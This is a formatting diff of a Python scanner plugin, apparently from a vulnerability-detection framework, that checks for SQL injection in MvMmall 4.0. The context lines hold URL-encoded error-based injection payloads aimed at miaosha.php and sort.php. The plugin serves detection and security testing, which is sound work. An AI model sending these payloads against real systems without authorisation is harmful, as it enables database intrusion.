@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'MvMmall_0002' # 平台漏洞编号，留空
+    vuln_id = 'MvMmall_0002'  # 平台漏洞编号，留空
     name = 'MvMmall4.0 多处sql注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-04-10'  # 漏洞公布时间
     desc = '''
         MvMmall4.0 多处sql注入：
@@ -24,6 +25,7 @@ class Vuln(ABVuln):
     product = 'MvMmall'  # 漏洞应用名称
     product_version = '4.0'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = '0966cc9d-8863-42f7-bc55-dcd4db506004'
     author = '47bwy'  # POC编写者
@@ -36,7 +38,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             payloads = [
                 '/miaosha.php?action=&cat_uid=&brand_uid=30%20OR%20updatexml%281%2CCONCAT%280x7e%2Cmd5%280x22%29%29%2C0%29',
                 '/sort.php?shop_name=%27or%20updatexml%281%2Cconcat%280x7e%2C%28md5%280x22%29%29%29%2C0%29or%27',
@@ -58,6 +60,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
